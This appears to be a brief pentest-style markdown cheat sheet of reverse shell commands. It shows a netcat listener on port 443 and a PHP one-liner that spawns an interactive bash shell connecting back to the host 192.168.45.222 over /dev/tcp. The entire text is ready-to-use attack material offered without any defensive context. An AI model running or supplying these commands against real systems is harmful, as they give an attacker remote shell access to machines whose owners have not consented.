# Commonly Reverse Shell Commands

---

## 🎧 **Start a Reverse Shell Listener**
```bash
nc -lvp 443
```

---

## 🏴 **Reverse Shell in Different Environment**
### **PHP**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.222/443 0>&1'"); ?>
```
